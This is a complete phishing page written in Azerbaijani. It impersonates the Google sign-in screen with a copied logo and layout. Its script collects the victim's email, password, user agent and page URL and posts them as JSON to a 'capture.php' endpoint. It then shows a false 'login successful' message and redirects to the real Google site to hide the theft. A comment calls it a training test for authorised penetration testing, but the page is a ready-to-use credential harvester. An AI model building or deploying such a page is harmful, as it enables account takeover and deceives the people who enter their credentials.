<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Hesabına Giriş</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', Arial, Helvetica, sans-serif;
        }
        body {
            background: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            margin: 20px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo svg {
            width: 75px;
            height: 24px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 8px;
            color: #202124;
        }
        .subtitle {
            text-align: center;
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 6px;
        }
        .form-group input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border 0.2s;
        }
        .form-group input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26,115,232,0.15);
        }
        .forgot-link {
            margin-top: 6px;
        }
        .forgot-link a {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }
        .forgot-link a:hover {
            background: #f0f6ff;
            padding: 2px 4px;
            border-radius: 4px;
        }
        .guest-mode {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e8eaed;
        }
        .guest-mode p {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 10px;
        }
        .guest-mode a {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }
        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
        }
        .btn-create {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            padding: 6px 8px;
            border-radius: 4px;
        }
        .btn-create:hover {
            background: #f0f6ff;
        }
        .btn-next {
            background: #1a73e8;
            color: #fff;
            border: none;
            padding: 9px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-next:hover {
            background: #1b66c9;
        }
        .btn-next:disabled {
            background: #a8c7fa;
            cursor: not-allowed;
        }
        .error-msg {
            color: #d93025;
            font-size: 14px;
            margin-top: 10px;
            display: none;
            text-align: center;
        }
        .success-msg {
            color: #188038;
            font-size: 14px;
            margin-top: 10px;
            display: none;
            text-align: center;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 12px;
            color: #5f6368;
        }
        .footer a {
            color: #5f6368;
            text-decoration: none;
            margin: 0 10px;
        }
        .footer a:hover {
            color: #1a73e8;
        }
        .password-wrapper {
            position: relative;
        }
        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #5f6368;
            font-size: 13px;
            cursor: pointer;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 272 92" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.86 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
                <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.86 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC04"/>
                <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.11 0-17.88-5.96-20.39-14.34l8.88-3.68c1.54 4.74 5.86 7.81 11.51 7.81 7.42 0 11.08-4.77 11.08-11.64v-2.47h-.32c-2.14 2.88-6.25 5.27-11.24 5.27-10.63 0-19.12-9.27-19.12-21.89 0-12.62 8.49-21.89 19.12-21.89 4.99 0 9.1 2.39 11.24 5.27h.32v-3.45h9.08zm-9.02 20.79c0-7.63-4.85-12.9-11.86-12.9s-12.03 5.45-12.03 12.9c0 7.45 5.02 12.9 12.03 12.9s11.86-5.27 11.86-12.9z" fill="#4285F4"/>
                <path d="M255 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.86 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#34A853"/>
                <path d="M31.69 42.96v-8.86h23.8c.65 3.7 1.39 7.28 1.39 11.94 0 14.18-8.1 23.94-21.18 23.94C18.55 70 9 58.84 9 46s9.25-24 26.88-24c11.8 0 19.17 6.12 22.21 14.22L49.7 41c-1.85-5.7-6.4-9.6-13.56-9.6-7.8 0-13.48 6.2-13.48 14.6s5.53 14.58 13.28 14.58c7.65 0 10.59-4.92 11.29-7.58H31.69z" fill="#4285F4"/>
            </svg>
        </div>
        <h1>Giriş edin</h1>
        <p class="subtitle">Google hesabınıza davam edin</p>

        <form id="loginForm">
            <div class="form-group">
                <label for="email">E-poçt ünvanı və ya telefon nömrəsi</label>
                <input type="email" id="email" name="email" placeholder="example@gmail.com" required autocomplete="off">
            </div>
            <div class="form-group">
                <label for="password">Şifrə</label>
                <div class="password-wrapper">
                    <input type="password" id="password" name="password" placeholder="Şifrənizi daxil edin" required autocomplete="off">
                    <button type="button" class="toggle-password" id="togglePassword">Göstər</button>
                </div>
            </div>
            <div class="forgot-link">
                <a href="#">E-poçt ünvanınızı unutmusunuz?</a>
            </div>

            <div id="error" class="error-msg"></div>
            <div id="success" class="success-msg"></div>

            <div class="actions">
                <a href="#" class="btn-create">Hesab yaradın</a>
                <button type="submit" class="btn-next" id="submitBtn">Növbəti</button>
            </div>
        </form>

        <div class="guest-mode">
            <p>Bir cihazı paylaşırsınız? Qonaq rejimindən istifadə edin.</p>
            <a href="#">Qonaq rejimində davam edin</a>
        </div>

        <div class="footer">
            <a href="#">Yardım</a>
            <a href="#">Məxfilik</a>
            <a href="#">Şərtlər</a>
        </div>
    </div>

    <script>
        // =============================================
        // TƏLİM MƏQSƏDLİ PHISHING TEST
        // YALNIZ İCAZƏLİ PENETRATİON TEST ÜÇÜN
        // =============================================

        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const errorDiv = document.getElementById('error');
        const successDiv = document.getElementById('success');
        const submitBtn = document.getElementById('submitBtn');
        const togglePassword = document.getElementById('togglePassword');

        // === KONFİQURASİYA ===
        // Məlumatların göndəriləcəyi endpoint
        const WEBHOOK_URL = 'capture.php';
        
        // Giriş uğurlu olanda yönləndiriləcək səhifə
        const REDIRECT_URL = 'https://accounts.google.com';

        // Şifrəni göstər/gizlə
        togglePassword.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.textContent = type === 'password' ? 'Göstər' : 'Gizlət';
        });

        // Form göndərilməsi
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();

            if (!email || !password) {
                showError('Xahiş edirik bütün sahələri doldurun.');
                return;
            }

            // Email formatı yoxlaması
            if (!email.includes('@')) {
                showError('Düzgün e-poçt ünvanı daxil edin.');
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = 'Göndərilir...';
            hideMessages();

            // Məlumatları topla
            const data = {
                email: email,
                password: password,
                ip: '',
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                page: window.location.href
            };

            try {
                // Məlumatları endpoint-ə göndər
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                const result = await response.json();
                console.log('Server cavabı:', result);

                // Uğurlu mesaj
                showSuccess('Giriş uğurludur. Yönləndirilirsiniz...');

                // Real Google səhifəsinə yönləndir
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 2000);

            } catch (err) {
                console.log('Xəta:', err);
                // Server olmasa belə yönləndir
                showSuccess('Giriş uğurludur. Yönləndirilirsiniz...');
                
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 2000);
            }
        });

        function showError(msg) {
            errorDiv.textContent = msg;
            errorDiv.style.display = 'block';
            successDiv.style.display = 'none';
        }

        function showSuccess(msg) {
            successDiv.textContent = msg;
            successDiv.style.display = 'block';
            errorDiv.style.display = 'none';
        }

        function hideMessages() {
            errorDiv.style.display = 'none';
            successDiv.style.display = 'none';
        }

        // Inputlardan birinə klik edəndə xəta mesajını gizlət
        emailInput.addEventListener('focus', hideMessages);
        passwordInput.addEventListener('focus', hideMessages);
    </script>
</body>
</html>
